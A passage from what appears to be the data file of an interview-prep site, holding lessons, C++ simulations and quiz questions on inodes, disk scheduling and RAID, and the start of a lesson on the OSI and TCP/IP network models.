links can create apparent cycles, but the OS handles this with a maximum symlink resolution depth.</div></div><div class="learn-section"><div class="learn-h">ext4 File System Features</div><p class="learn-p"><b>ext4</b> is the default Linux file system. Key features:</p><ul class="learn-list"><li><b>Journaling:</b> Logs metadata changes before writing them. On crash, replay the journal to restore consistency.</li><li><b>Extents:</b> Instead of block-by-block mapping, uses extents (contiguous block ranges) for more efficient allocation.</li><li><b>Delayed allocation:</b> Postpones block allocation until data is flushed to disk, allowing better decisions about contiguous placement.</li><li><b>Max file size:</b> 16 TB (with 4KB blocks).</li><li><b>Max filesystem size:</b> 1 EB (exabyte).</li></ul></div>',
          code: `// Inode and Directory Structure Simulation in C++
#include <iostream>
#include <unordered_map>
#include <vector>
#include <string>
#include <ctime>
using namespace std;

// Simplified inode structure
struct Inode {
    int inodeNum;
    char fileType;      // 'f' = file, 'd' = directory
    string permissions; // e.g., "rwxr-xr-x"
    int uid, gid;       // Owner and group
    int size;           // File size in bytes
    int linkCount;      // Hard link count
    time_t created, modified, accessed;
    vector<int> directBlocks;    // 12 direct block pointers
    int singleIndirect;          // Single indirect block pointer
    int doubleIndirect;          // Double indirect block pointer
};

// Directory entry: name -> inode number
struct DirEntry {
    string name;
    int inodeNum;
};

class SimpleFileSystem {
    int nextInodeNum;
    int nextBlockNum;
    unordered_map<int, Inode> inodeTable;
    unordered_map<int, vector<DirEntry>> directories; // inode -> entries

public:
    SimpleFileSystem() : nextInodeNum(1), nextBlockNum(100) {
        // Create root directory
        createInode('d', "rwxr-xr-x", 0, 0);
        directories[1] = {{"..", 1}, {".", 1}};
        cout << "File system initialized. Root inode = 1" << endl;
    }

    int createInode(char type, string perms, int uid, int gid) {
        int ino = nextInodeNum++;
        Inode inode;
        inode.inodeNum = ino;
        inode.fileType = type;
        inode.permissions = perms;
        inode.uid = uid;
        inode.gid = gid;
        inode.size = 0;
        inode.linkCount = 1;
        inode.created = inode.modified = inode.accessed = time(NULL);
        inode.singleIndirect = -1;
        inode.doubleIndirect = -1;
        inodeTable[ino] = inode;
        return ino;
    }

    void createFile(int parentInode, string name, int size) {
        int ino = createInode('f', "rw-r--r--", 1000, 1000);
        Inode &inode = inodeTable[ino];
        inode.size = size;

        // Allocate blocks (simplified: 4KB blocks)
        int blocksNeeded = (size + 4095) / 4096;
        for (int i = 0; i < min(blocksNeeded, 12); i++) {
            inode.directBlocks.push_back(nextBlockNum++);
        }
        if (blocksNeeded > 12) {
            inode.singleIndirect = nextBlockNum++;
        }

        // Add to parent directory
        directories[parentInode].push_back({name, ino});
        cout << "Created file '" << name << "' inode=" << ino
             << " size=" << size << " blocks=" << blocksNeeded << endl;
    }

    void createHardLink(int parentInode, string name, int targetInode) {
        if (inodeTable[targetInode].fileType == 'd') {
            cout << "Error: Cannot hard link directories!" << endl;
            return;
        }
        directories[parentInode].push_back({name, targetInode});
        inodeTable[targetInode].linkCount++;
        cout << "Hard link '" << name << "' -> inode " << targetInode
             << " (link count=" << inodeTable[targetInode].linkCount
             << ")" << endl;
    }

    void listDirectory(int dirInode) {
        cout << "\\nDirectory listing (inode " << dirInode << "):" << endl;
        cout << "Inode\\tType\\tPerms\\t\\tLinks\\tSize\\tName" << endl;
        for (auto& entry : directories[dirInode]) {
            Inode& ino = inodeTable[entry.inodeNum];
            cout << ino.inodeNum << "\\t"
                 << (ino.fileType == 'd' ? "DIR" : "FILE") << "\\t"
                 << ino.permissions << "\\t"
                 << ino.linkCount << "\\t"
                 << ino.size << "\\t"
                 << entry.name << endl;
        }
    }

    void showInodeDetails(int inodeNum) {
        if (inodeTable.find(inodeNum) == inodeTable.end()) {
            cout << "Inode not found!" << endl;
            return;
        }
        Inode& ino = inodeTable[inodeNum];
        cout << "\\nInode " << ino.inodeNum << " details:" << endl;
        cout << "  Type: " << (ino.fileType == 'd' ? "Directory" : "File")
             << endl;
        cout << "  Permissions: " << ino.permissions << endl;
        cout << "  UID:GID: " << ino.uid << ":" << ino.gid << endl;
        cout << "  Size: " << ino.size << " bytes" << endl;
        cout << "  Links: " << ino.linkCount << endl;
        cout << "  Direct blocks: ";
        for (int b : ino.directBlocks) cout << b << " ";
        cout << endl;
        if (ino.singleIndirect != -1)
            cout << "  Single indirect: " << ino.singleIndirect << endl;
    }
};

int main() {
    SimpleFileSystem fs;

    // Create files in root directory
    fs.createFile(1, "hello.c", 2048);
    fs.createFile(1, "data.bin", 50000);
    fs.createFile(1, "notes.txt", 512);

    // Create hard link
    fs.createHardLink(1, "hello_link.c", 2); // Link to hello.c

    // List root directory
    fs.listDirectory(1);

    // Show inode details
    fs.showInodeDetails(2); // hello.c
    fs.showInodeDetails(3); // data.bin

    return 0;
}`,
          problems: [
            ['Inode in Operating System', 'https://www.geeksforgeeks.org/inode-in-operating-system/', 'Easy'],
            ['File Allocation Table (FAT)', 'https://www.geeksforgeeks.org/file-allocation-table-fat/', 'Medium'],
            ['Hard vs Soft Links', 'https://www.geeksforgeeks.org/difference-between-hard-link-and-soft-link/', 'Easy'],
          ],
          mcqs: [
            {q: 'Which of the following is NOT stored in a Unix inode?', o: ['File permissions', 'File name', 'File size', 'Block pointers'], a: 1},
            {q: 'What happens when you delete a file that has 2 hard links?', o: ['The file is deleted from disk', 'The link count decreases to 1; file data is preserved', 'Both hard links are removed', 'The file becomes a symbolic link'], a: 1},
            {q: 'In FAT, where is the pointer to the next block of a file stored?', o: ['In the file\'s directory entry', 'In the data block itself', 'In the File Allocation Table', 'In the inode'], a: 2},
          ],
        },
        // ----- Topic 2: Disk Scheduling -----
        {
          t: 'Disk Scheduling',
          learn: '<div class="learn-section"><div class="learn-h">Disk Structure and Access Time</div><p class="learn-p">A traditional <b>hard disk drive (HDD)</b> consists of platters spinning at high speed (5400&ndash;15000 RPM). Data is read/written by a head that moves across the platter surface. The total time to access data on disk has three components:</p><table class="learn-table"><tr><th>Component</th><th>Description</th><th>Typical Time</th></tr><tr><td>Seek Time</td><td>Time to move the head to the correct track/cylinder</td><td>3&ndash;15 ms</td></tr><tr><td>Rotational Latency</td><td>Time for the desired sector to rotate under the head</td><td>2&ndash;6 ms</td></tr><tr><td>Transfer Time</td><td>Time to transfer the data</td><td>~0.1 ms per sector</td></tr></table><p class="learn-p"><b>Seek time</b> is the dominant factor, so disk scheduling algorithms aim to <b>minimize total seek time</b> by ordering requests intelligently.</p></div><div class="learn-section"><div class="learn-h">FCFS Disk Scheduling</div><p class="learn-p">Requests are serviced in the order they arrive. Fair but can result in large seek distances.</p><p class="learn-p"><b>Example:</b> Head starts at track 53. Request queue: 98, 183, 37, 122, 14, 124, 65, 67.</p><div class="learn-code">Head movement: 53 -> 98 -> 183 -> 37 -> 122 -> 14 -> 124 -> 65 -> 67\nTotal head movement = |53-98| + |98-183| + |183-37| + |37-122|\n                    + |122-14| + |14-124| + |124-65| + |65-67|\n                    = 45 + 85 + 146 + 85 + 108 + 110 + 59 + 2\n                    = 640 tracks</div></div><div class="learn-section"><div class="learn-h">SSTF (Shortest Seek Time First)</div><p class="learn-p">Always service the request <b>closest to the current head position</b>. Reduces total seek time compared to FCFS but can cause <b>starvation</b> of requests at the edges of the disk.</p><div class="learn-code">Head at 53: Closest is 65\n53 -> 65 -> 67 -> 37 -> 14 -> 98 -> 122 -> 124 -> 183\nTotal = 12 + 2 + 30 + 23 + 84 + 24 + 2 + 59 = 236 tracks</div><div class="learn-warn"><b>Warning:</b> SSTF is similar to SJF in CPU scheduling &mdash; it\'s not necessarily optimal, and it can starve requests at the extremes of the disk.</div></div><div class="learn-section"><div class="learn-h">SCAN (Elevator Algorithm)</div><p class="learn-p">The head moves in one direction, servicing all requests along the way, then <b>reverses direction</b> when it reaches the end of the disk (or the last request in that direction). Named after an elevator.</p><div class="learn-code">Head at 53, moving toward 0:\n53 -> 37 -> 14 -> 0 (reverse) -> 65 -> 67 -> 98 -> 122 -> 124 -> 183\nTotal = 16 + 23 + 14 + 0 + 65 + 2 + 31 + 24 + 2 + 59 = 236 tracks</div></div><div class="learn-section"><div class="learn-h">C-SCAN (Circular SCAN)</div><p class="learn-p">Like SCAN, but the head only services requests in <b>one direction</b>. When it reaches the end, it immediately returns to the beginning without servicing any requests on the return trip. This provides a <b>more uniform wait time</b>.</p><div class="learn-code">Head at 53, moving toward 199:\n53 -> 65 -> 67 -> 98 -> 122 -> 124 -> 183 -> 199 (jump to 0) -> 14 -> 37\nTotal = 12+2+31+24+2+59+16 + (199-0) + 14+23 = 382 tracks\n(The jump from 199 to 0 is often not counted as head movement)</div></div><div class="learn-section"><div class="learn-h">LOOK and C-LOOK</div><p class="learn-p"><b>LOOK</b> is a practical version of SCAN: the head reverses direction when it reaches the <b>last request in that direction</b> (not the end of the disk). Similarly, <b>C-LOOK</b> is a practical version of C-SCAN.</p><div class="learn-code">C-LOOK at 53, moving toward high end:\n53 -> 65 -> 67 -> 98 -> 122 -> 124 -> 183 (jump to 14) -> 14 -> 37\nTotal = 12+2+31+24+2+59 + (183-14) + 23 = 322 tracks</div></div><div class="learn-section"><div class="learn-h">Comparison of Disk Scheduling Algorithms</div><table class="learn-table"><tr><th>Algorithm</th><th>Seek Distance</th><th>Starvation?</th><th>Fairness</th><th>Used In</th></tr><tr><td>FCFS</td><td>High</td><td>No</td><td>Fair (FIFO order)</td><td>Simple systems</td></tr><tr><td>SSTF</td><td>Low</td><td>Yes (edges)</td><td>Unfair</td><td>General use</td></tr><tr><td>SCAN</td><td>Medium-Low</td><td>No</td><td>Biased toward middle</td><td>Most OS</td></tr><tr><td>C-SCAN</td><td>Medium</td><td>No</td><td>Uniform wait time</td><td>Heavy-load systems</td></tr><tr><td>LOOK</td><td>Low</td><td>No</td><td>Good</td><td>Linux default</td></tr><tr><td>C-LOOK</td><td>Medium-Low</td><td>No</td><td>Good</td><td>Most practical</td></tr></table><div class="learn-tip"><b>Tip:</b> For SSDs, disk scheduling is much less important because there are no moving parts and seek time is nearly zero. The OS I/O scheduler for SSDs typically uses a simple FIFO or deadline-based approach.</div></div>',
          code: `// Disk Scheduling Algorithms in C++
#include <iostream>
#include <vector>
#include <algorithm>
#include <cmath>
#include <climits>
using namespace std;

void printResult(string name, vector<int>& order, int totalSeek) {
    cout << "\\n=== " << name << " ===" << endl;
    cout << "Order: ";
    for (int t : order) cout << t << " ";
    cout << "\\nTotal seek distance: " << totalSeek << " tracks" << endl;
}

// FCFS Disk Scheduling
int fcfs(vector<int> requests, int head) {
    vector<int> order = {head};
    int total = 0;
    for (int r : requests) {
        total += abs(head - r);
        head = r;
        order.push_back(r);
    }
    printResult("FCFS", order, total);
    return total;
}

// SSTF (Shortest Seek Time First)
int sstf(vector<int> requests, int head) {
    vector<int> order = {head};
    vector<bool> done(requests.size(), false);
    int total = 0;

    for (int i = 0; i < (int)requests.size(); i++) {
        int minDist = INT_MAX, idx = -1;
        for (int j = 0; j < (int)requests.size(); j++) {
            if (!done[j] && abs(head - requests[j]) < minDist) {
                minDist = abs(head - requests[j]);
                idx = j;
            }
        }
        done[idx] = true;
        total += minDist;
        head = requests[idx];
        order.push_back(head);
    }
    printResult("SSTF", order, total);
    return total;
}

// SCAN (Elevator)
int scan(vector<int> requests, int head, int diskSize, bool goingUp) {
    vector<int> order = {head};
    sort(requests.begin(), requests.end());
    int total = 0;

    vector<int> left, right;
    for (int r : requests) {
        if (r < head) left.push_back(r);
        else right.push_back(r);
    }

    if (goingUp) {
        for (int r : right) { total += abs(head - r); head = r; order.push_back(r); }
        if (!left.empty()) {
            total += abs(head - (diskSize - 1)); head = diskSize - 1;
            order.push_back(head);
            for (int i = left.size() - 1; i >= 0; i--) {
                total += abs(head - left[i]); head = left[i]; order.push_back(head);
            }
        }
    } else {
        for (int i = left.size() - 1; i >= 0; i--) {
            total += abs(head - left[i]); head = left[i]; order.push_back(head);
        }
        total += head; head = 0; order.push_back(0); // Go to 0
        for (int r : right) { total += abs(head - r); head = r; order.push_back(r); }
    }
    printResult("SCAN", order, total);
    return total;
}

// C-LOOK
int clook(vector<int> requests, int head) {
    vector<int> order = {head};
    sort(requests.begin(), requests.end());
    int total = 0;

    vector<int> left, right;
    for (int r : requests) {
        if (r < head) left.push_back(r);
        else right.push_back(r);
    }

    // Service right side first
    for (int r : right) {
        total += abs(head - r);
        head = r;
        order.push_back(r);
    }
    // Jump to leftmost request
    if (!left.empty()) {
        total += abs(head - left[0]);
        head = left[0];
        order.push_back(head);
        for (int i = 1; i < (int)left.size(); i++) {
            total += abs(head - left[i]);
            head = left[i];
            order.push_back(head);
        }
    }
    printResult("C-LOOK", order, total);
    return total;
}

int main() {
    vector<int> requests = {98, 183, 37, 122, 14, 124, 65, 67};
    int head = 53;
    int diskSize = 200;

    cout << "Disk size: " << diskSize << " tracks" << endl;
    cout << "Initial head position: " << head << endl;
    cout << "Request queue: ";
    for (int r : requests) cout << r << " ";
    cout << endl;

    int f = fcfs(requests, head);
    int s = sstf(requests, head);
    int sc = scan(requests, head, diskSize, true);
    int cl = clook(requests, head);

    cout << "\\n=== Summary ===" << endl;
    cout << "FCFS:   " << f << " tracks" << endl;
    cout << "SSTF:   " << s << " tracks" << endl;
    cout << "SCAN:   " << sc << " tracks" << endl;
    cout << "C-LOOK: " << cl << " tracks" << endl;

    return 0;
}`,
          problems: [
            ['Disk Scheduling Algorithms', 'https://www.geeksforgeeks.org/disk-scheduling-algorithms/', 'Medium'],
            ['SCAN vs C-SCAN', 'https://www.geeksforgeeks.org/difference-between-scan-and-cscan-disk-scheduling-algorithms/', 'Easy'],
            ['SSTF Disk Scheduling', 'https://www.geeksforgeeks.org/program-for-sstf-disk-scheduling-algorithm/', 'Medium'],
          ],
          mcqs: [
            {q: 'Which disk scheduling algorithm is also known as the Elevator Algorithm?', o: ['FCFS', 'SSTF', 'SCAN', 'C-LOOK'], a: 2},
            {q: 'What is the main advantage of C-SCAN over SCAN?', o: ['Lower total seek distance', 'More uniform wait time for all tracks', 'Simpler implementation', 'No head movement needed'], a: 1},
            {q: 'Which disk scheduling algorithm can cause starvation of requests at the disk edges?', o: ['FCFS', 'SSTF', 'SCAN', 'C-SCAN'], a: 1},
          ],
        },
        // ----- Topic 3: RAID Levels -----
        {
          t: 'RAID Levels',
          learn: '<div class="learn-section"><div class="learn-h">What is RAID?</div><p class="learn-p"><b>RAID (Redundant Array of Independent Disks)</b> is a technique that uses multiple physical disk drives to achieve improved performance, reliability, or both. RAID presents multiple disks as a single logical disk to the operating system.</p><p class="learn-p"><b>Key concepts:</b></p><ul class="learn-list"><li><b>Striping:</b> Distributing data across multiple disks for parallelism (performance).</li><li><b>Mirroring:</b> Duplicating data across disks for redundancy (reliability).</li><li><b>Parity:</b> Computed check data that enables reconstruction of lost data.</li></ul></div><div class="learn-section"><div class="learn-h">RAID 0 (Striping)</div><p class="learn-p">Data is striped across all disks with <b>no redundancy</b>.</p><ul class="learn-list"><li><b>Capacity:</b> N disks &times; disk size (100% utilization)</li><li><b>Read performance:</b> Up to N&times; (parallel reads)</li><li><b>Write performance:</b> Up to N&times; (parallel writes)</li><li><b>Fault tolerance:</b> <b>None</b> &mdash; if any disk fails, all data is lost.</li><li><b>Minimum disks:</b> 2</li></ul><div class="learn-warn"><b>Warning:</b> RAID 0 actually <b>decreases</b> reliability because the probability of failure increases with more disks. It should only be used for data that can be easily recreated (e.g., scratch space, cache).</div></div><div class="learn-section"><div class="learn-h">RAID 1 (Mirroring)</div><p class="learn-p">Every disk has an exact <b>mirror (copy)</b>. Data is written to both disks simultaneously.</p><ul class="learn-list"><li><b>Capacity:</b> 50% utilization (half the total disk space is usable)</li><li><b>Read performance:</b> Up to 2&times; (can read from either mirror)</li><li><b>Write performance:</b> 1&times; (must write to both)</li><li><b>Fault tolerance:</b> Can survive 1 disk failure per mirrored pair</li><li><b>Minimum disks:</b> 2</li></ul></div><div class="learn-section"><div class="learn-h">RAID 5 (Striping with Distributed Parity)</div><p class="learn-p">Data and parity are <b>striped across all disks</b>. Parity is distributed (rotated) across all disks to avoid a bottleneck on any single parity disk.</p><ul class="learn-list"><li><b>Capacity:</b> (N-1) &times; disk size (one disk\'s worth is used for parity)</li><li><b>Read performance:</b> (N-1)&times; (reads from all data disks in parallel)</li><li><b>Write performance:</b> Lower than RAID 0 (must compute and write parity)</li><li><b>Fault tolerance:</b> Can survive <b>1 disk failure</b>. The failed disk\'s data is reconstructed from parity.</li><li><b>Minimum disks:</b> 3</li></ul><div class="learn-code">// RAID 5 with 4 disks (A, B, C, D):\n// Stripe 1: D1a  D1b  D1c  P1   (parity on disk D)\n// Stripe 2: D2a  D2b  P2   D2c  (parity on disk C)\n// Stripe 3: D3a  P3   D3b  D3c  (parity on disk B)\n// Stripe 4: P4   D4a  D4b  D4c  (parity on disk A)\n// Parity = XOR of all data blocks in the stripe\n// If disk B fails: D3b = D3a XOR P3 XOR D3c</div></div><div class="learn-section"><div class="learn-h">RAID 6 (Dual Parity)</div><p class="learn-p">Like RAID 5 but uses <b>two independent parity calculations</b> (P and Q). Can survive <b>2 simultaneous disk failures</b>.</p><ul class="learn-list"><li><b>Capacity:</b> (N-2) &times; disk size</li><li><b>Fault tolerance:</b> Survives 2 disk failures</li><li><b>Minimum disks:</b> 4</li><li><b>Write penalty:</b> Higher than RAID 5 (must update 2 parity blocks)</li></ul></div><div class="learn-section"><div class="learn-h">RAID 10 (1+0: Mirrors then Stripes)</div><p class="learn-p"><b>RAID 10</b> combines RAID 1 and RAID 0: data is first <b>mirrored</b>, then <b>striped</b> across the mirror pairs.</p><ul class="learn-list"><li><b>Capacity:</b> 50% utilization</li><li><b>Performance:</b> Excellent read and write (like RAID 0 with redundancy)</li><li><b>Fault tolerance:</b> Can survive 1 failure per mirror pair (best case: N/2 failures)</li><li><b>Minimum disks:</b> 4</li><li><b>Use case:</b> Databases, high-performance applications that need both speed and reliability</li></ul></div><div class="learn-section"><div class="learn-h">RAID Level Comparison</div><table class="learn-table"><tr><th>RAID</th><th>Min Disks</th><th>Usable Capacity</th><th>Fault Tolerance</th><th>Read</th><th>Write</th><th>Use Case</th></tr><tr><td>0</td><td>2</td><td>100%</td><td>None</td><td>Excellent</td><td>Excellent</td><td>Scratch, temp data</td></tr><tr><td>1</td><td>2</td><td>50%</td><td>1 disk</td><td>Good</td><td>Fair</td><td>Boot drives, logs</td></tr><tr><td>5</td><td>3</td><td>(N-1)/N</td><td>1 disk</td><td>Good</td><td>Fair</td><td>General storage</td></tr><tr><td>6</td><td>4</td><td>(N-2)/N</td><td>2 disks</td><td>Good</td><td>Poor</td><td>Critical data</td></tr><tr><td>10</td><td>4</td><td>50%</td><td>1 per pair</td><td>Excellent</td><td>Good</td><td>Databases</td></tr></table><div class="learn-tip"><b>Tip:</b> For interviews, focus on RAID 0, 1, 5, and 10. Know the trade-offs between performance, capacity, and reliability. RAID 5 is the most common "general-purpose" RAID level, while RAID 10 is preferred for write-heavy workloads like databases.</div></div>',
          code: `// RAID Simulation: Striping, Mirroring, and Parity
#include <iostream>
#include <vector>
#include <string>
#include <bitset>
using namespace std;

// RAID 0: Striping across N disks
class RAID0 {
    int numDisks;
    vector<vector<string>> disks;
    int stripeUnit; // blocks per stripe unit

public:
    RAID0(int n, int capacity) : numDisks(n), stripeUnit(1) {
        disks.resize(n);
        for (auto& d : disks) d.resize(capacity, "---");
        cout << "RAID 0: " << n << " disks, striped" << endl;
    }

    void writeBlock(int logicalBlock, string data) {
        int diskNum = logicalBlock % numDisks;
        int diskBlock = logicalBlock / numDisks;
        disks[diskNum][diskBlock] = data;
        cout << "Write block " << logicalBlock << " -> Disk "
             << diskNum << "[" << diskBlock << "] = " << data << endl;
    }

    void display() {
        cout << "\\nRAID 0 Layout:" << endl;
        for (int b = 0; b < 4; b++) {
            for (int d = 0; d < numDisks; d++)
                cout << "D" << d << "[" << disks[d][b] << "]\\t";
            cout << endl;
        }
    }
};

// RAID 1: Mirroring
class RAID1 {
    vector<string> primary, mirror;

public:
    RAID1(int capacity) {
        primary.resize(capacity, "---");
        mirror.resize(capacity, "---");
        cout << "RAID 1: Mirrored pair" << endl;
    }

    void writeBlock(int block, string data) {
        primary[block] = data;
        mirror[block] = data;  // Write to both!
        cout << "Write block " << block << " -> Primary & Mirror = "
             << data << endl;
    }

    string readBlock(int block, bool primaryFailed = false) {
        if (primaryFailed) {
            cout << "Primary failed! Reading from mirror." << endl;
            return mirror[block];
        }
        return primary[block];
    }
};

// RAID 5: Striping with distributed parity
class RAID5 {
    int numDisks;
    vector<vector<string>> disks;

    // XOR-based parity (simplified with string representation)
    int computeParityByte(vector<int>& dataBytes) {
        int parity = 0;
        for (int b : dataBytes) parity ^= b;
        return parity;
    }

public:
    RAID5(int n, int capacity) : numDisks(n) {
        disks.resize(n);
        for (auto& d : disks) d.resize(capacity, "---");
        cout << "RAID 5: " << n << " disks, distributed parity" << endl;
    }

    void writeStripe(int stripeNum, vector<string>& data) {
        // Parity disk rotates: stripe N uses disk (N % numDisks) for parity
        int parityDisk = stripeNum % numDisks;

        cout << "Stripe " << stripeNum << " (parity on disk "
             << parityDisk << "): ";

        int dataIdx = 0;
        for (int d = 0; d < numDisks; d++) {
            if (d == parityDisk) {
                disks[d][stripeNum] = "P" + to_string(stripeNum);
                cout << "[P" << stripeNum << "] ";
            } else {
                disks[d][stripeNum] = data[dataIdx++];
                cout << "[" << disks[d][stripeNum] << "] ";
            }
        }
        cout << endl;
    }

    // Simulate disk failure and reconstruction
    void simulateFailure(int failedDisk) {
        cout << "\\n!!! Disk " << failedDisk << " FAILED !!!" << endl;
        cout << "Reconstructing data using parity..." << endl;
        for (int stripe = 0; stripe < 4; stripe++) {
            cout << "  Stripe " << stripe << ": XOR of remaining disks -> "
                 << "Disk " << failedDisk << " reconstructed" << endl;
        }
    }

    void display() {
        cout << "\\nRAID 5 Layout:" << endl;
        cout << "Stripe\\t";
        for (int d = 0; d < numDisks; d++) cout << "Disk" << d << "\\t";
        cout << endl;
        for (int s = 0; s < 4; s++) {
            cout << s << "\\t";
            for (int d = 0; d < numDisks; d++)
                cout << disks[d][s] << "\\t";
            cout << endl;
        }
    }
};

int main() {
    // RAID 0 Demo
    cout << "========== RAID 0 ==========" << endl;
    RAID0 raid0(4, 10);
    for (int i = 0; i < 8; i++)
        raid0.writeBlock(i, "B" + to_string(i));
    raid0.display();

    // RAID 1 Demo
    cout << "\\n========== RAID 1 ==========" << endl;
    RAID1 raid1(10);
    raid1.writeBlock(0, "AAA");
    raid1.writeBlock(1, "BBB");
    cout << "Normal read[0]: " << raid1.readBlock(0) << endl;
    cout << "Failed read[0]: " << raid1.readBlock(0, true) << endl;

    // RAID 5 Demo
    cout << "\\n========== RAID 5 ==========" << endl;
    RAID5 raid5(4, 10);
    vector<string> s0 = {"A1", "A2", "A3"};
    vector<string> s1 = {"B1", "B2", "B3"};
    vector<string> s2 = {"C1", "C2", "C3"};
    vector<string> s3 = {"D1", "D2", "D3"};
    raid5.writeStripe(0, s0);
    raid5.writeStripe(1, s1);
    raid5.writeStripe(2, s2);
    raid5.writeStripe(3, s3);
    raid5.display();
    raid5.simulateFailure(2);

    // Capacity comparison
    cout << "\\n=== Capacity (4 disks x 1TB each) ===" << endl;
    cout << "RAID 0: " << 4 << " TB (100%)" << endl;
    cout << "RAID 1: " << 2 << " TB (50%)" << endl;
    cout << "RAID 5: " << 3 << " TB (75%)" << endl;
    cout << "RAID 6: " << 2 << " TB (50%)" << endl;
    cout << "RAID10: " << 2 << " TB (50%)" << endl;

    return 0;
}`,
          problems: [
            ['RAID Levels in DBMS', 'https://www.geeksforgeeks.org/raid-redundant-arrays-of-independent-disks/', 'Easy'],
            ['RAID 5 Parity Calculation', 'https://www.geeksforgeeks.org/raid-redundant-arrays-of-independent-disks/', 'Medium'],
            ['Difference between RAID 0, 1, 5, 10', 'https://www.geeksforgeeks.org/difference-between-raid-0-raid-1-raid-5-and-raid-10/', 'Easy'],
          ],
          mcqs: [
            {q: 'Which RAID level offers the best write performance but no fault tolerance?', o: ['RAID 0', 'RAID 1', 'RAID 5', 'RAID 10'], a: 0},
            {q: 'How many disk failures can RAID 5 tolerate?', o: ['0', '1', '2', 'N/2'], a: 1},
            {q: 'For a database server requiring both high performance and fault tolerance, which RAID level is most commonly recommended?', o: ['RAID 0', 'RAID 1', 'RAID 5', 'RAID 10'], a: 3},
          ],
        },
      ],
    },
  ],
};const CN_CONTENT = {
  id: 'cn', t: 'Computer Networks',
  tabs: [
    // ==================== TAB 1: Network Models ====================
    {
      id: 'models', t: 'Network Models',
      topics: [
        {
          t: 'OSI & TCP/IP Models',
          learn: '<div class="learn-section"><div class="learn-h">Introduction to Network Models</div><p class="learn-p">Network models provide a <b>layered abstraction</b> for understanding how data travels from one machine to another across a network. The two most important models are the <b>OSI (Open Systems Interconnection)</b> model and the <b>TCP/IP model</b>. The OSI model has <b>7 layers</b> while the TCP/IP model has <b>4 (or 5) layers</b>. These models help engineers reason about protocols, troubleshoot networking issues, and design interoperable systems.</p><p class="learn-p">In interviews, you are expected to know each layer\'s responsibilities, the protocols that operate at each layer, and how data is encapsulated as it moves down the stack and de-encapsulated as it moves up.</p></div><div class="learn-section"><div class="learn-h">The OSI Model — 7 Layers</div><p class="learn-p">The OSI model was developed by the <b>ISO (International Organization for Standardization)</b> in 1984. It divides networking into seven layers, each with a distinct responsibility:</p><table class="learn-table"><tr><th>Layer #</th><th>Name</th><th>PDU</th><th>Key Protocols / Devices</th><th>Responsibility</th></tr><tr><td>7</td><td>Application</td><td>Data</td><td>HTTP, FTP, SMTP, DNS</td><td>User-facing services, APIs</td></tr><tr><td>6</td><td>Presentation</td><td>Data</td><td>SSL/TLS, JPEG, ASCII</td><td>Encryption, compression, encoding</td></tr><tr><td>5</td><td>Session</td><td>Data</td><td>NetBIOS, RPC, PPTP</td><td>Session establishment &amp; teardown</td></tr><tr><td>4</td><td>Transport</td><td>Segment / Datagram</td><td>TCP, UDP</td><td>End-to-end delivery, flow control</td></tr><tr><td>3</td><td>Network</td><td>Packet</td><td>IP, ICMP, ARP, Routers</td><td>Logical addressing, routing</td></tr><tr><td>2</td><td>Data Link</td><td>Frame</td><td>Ethernet, Wi-Fi, Switches</td><td>MAC addressing, error detection</td></tr><tr><td>1</td><td>Physical</td><td>Bits</td><td>Cables, Hubs, Repeaters</td><td>Raw bit transmission</td></tr></table><div class="learn-tip"><b>Tip:</b> A popular mnemonic to remember the layers top-down is <b>"All People Seem To Need Data Processing"</b> (Application, Presentation, Session, Transport, Network, Data Link, Physical).</div></div><div class="learn-section"><div class="learn-h">Data Encapsulation in OSI</div><p class="learn-p">As data moves <b>down</b> the stack from application to physical, each layer wraps the data with its own <b>header (and sometimes trailer)</b>. This is called <b>encapsulation</b>. When the data arrives at the receiving host, each layer strips its respective header — this is <b>de-encapsulation</b>.</p><div class="learn-code">Application Layer  : Data\nTransport Layer    : [TCP Header] + Data  =  Segment\nNetwork Layer      : [IP Header] + Segment  =  Packet\nData Link Layer    : [Frame Header] + Packet + [Frame Trailer]  =  Frame\nPhysical Layer     : 010110110... (bits on the wire)</div><p class="learn-p">The <b>Protocol Data Unit (PDU)</b> changes at each layer: Data &rarr; Segment &rarr; Packet &rarr; Frame &rarr; Bits.</p></div><div class="learn-section"><div class="learn-h">The TCP/IP Model — 4 Layers</div><p class="learn-p">The TCP/IP model (also called the <b>Internet Protocol Suite</b>) is the practical model used by the modern Internet. It was developed by the <b>DoD (Department of Defense)</b> and predates the OSI model.</p><table class="learn-table"><tr><th>TCP/IP Layer</th><th>Equivalent OSI Layers</th><th>Key Protocols</th></tr><tr><td>Application</td><td>Application + Presentation + Session (5, 6, 7)</td><td>HTTP, FTP, DNS, SMTP, SSH, TLS</td></tr><tr><td>Transport</td><td>Transport (4)</td><td>TCP, UDP</td></tr><tr><td>Internet</td><td>Network (3)</td><td>IP (v4/v6), ICMP, ARP, IGMP</td></tr><tr><td>Network Access (Link)</td><td>Data Link + Physical (1, 2)</td><td>Ethernet, Wi-Fi, PPP</td></tr></table><p class="learn-p">Some textbooks use a <b>5-layer model</b> that splits the Network Access layer into Data Link and Physical, which maps more cleanly to OSI.</p></div><div class="learn-section"><div class="learn-h">OSI vs TCP/IP — Key Differences</div><table class="learn-table"><tr><th>Aspect</th><th>OSI Model</th><th>TCP/IP Model</th></tr><tr><td>Layers</td><td>7</td><td>4 (or 5)</td></tr><tr><td>Developed by</td><td>ISO</td><td>DoD / DARPA</td></tr><tr><td>Approach</td><td>Theoretical, reference model</td><td>Practical, implementation-based</td></tr><tr><td>Session &amp; Presentation</td><td>Separate layers</td><td>Merged into Application</td></tr><tr><td>Protocol dependence</td><td>Protocol-independent</td><td>Based on standard protocols (TCP, IP)</td></tr><tr><td>Usage</td><td>Teaching &amp; conceptual</td><td>Real-world Internet</td></tr></table><div class="learn-warn"><b>Warning:</b> A common interview mistake is saying the Internet uses the OSI model. The Internet uses the <b>TCP/IP model</b>. OSI is a reference/teaching model. However, network engineers still reference OSI layer numbers (e.g., "Layer 7 firewall") in practice.</div></div><div class="learn-section"><div class="learn-h">How Data Flows in Real Networks</div><p class="learn-p">Consider a user requesting a webpage. Here is the end-to-end flow:</p><ol class="learn-list"><li><b>Application Layer:</b> The browser creates an HTTP GET request.</li><li><b>Transport Layer:</b> TCP segments the data and adds source/destination port numbers. A 3-way handshake may have already established the connection.</li><li><b>Network Layer:</b> IP adds source and destination IP addresses. Routing decisions are made hop by hop.</li><li><b>Data Link Layer:</b> Ethernet frames are created with MAC addresses. ARP resolves IP to MAC if needed.</li><li><b>Physical Layer:</b> Bits are transmitted as electrical signals, light pulses, or radio waves.</li></ol><p class="learn-p">At the receiving server, the process reverses: bits &rarr; frame &rarr; packet &rarr; segment &rarr; HTTP data delivered to the web server application.</p></div><div class="learn-section"><div 